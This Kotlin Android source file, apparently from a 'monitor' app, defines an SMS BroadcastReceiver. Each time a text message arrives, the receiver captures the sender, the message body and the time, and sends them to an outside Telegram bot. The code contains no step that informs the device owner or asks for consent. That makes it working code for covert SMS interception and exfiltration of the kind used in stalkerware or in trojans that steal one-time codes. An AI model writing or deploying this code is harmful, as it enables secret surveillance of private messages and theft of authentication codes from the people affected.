package com.dec.monitor.sms

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        for (sms in messages) {
            val from = sms.originatingAddress ?: "unknown"
            val body = sms.messageBody ?: ""
            val time = SimpleDateFormat("HH:mm:ss dd/MM", Locale.getDefault()).format(Date())

            CoroutineScope(Dispatchers.IO).launch {
                TelegramBot.sendMessage(
                    "💬 <b>SMS Received</b>\nFrom: <code>$from</code>\nTime: $time\n\n$body"
                )
            }
        }
    }
}
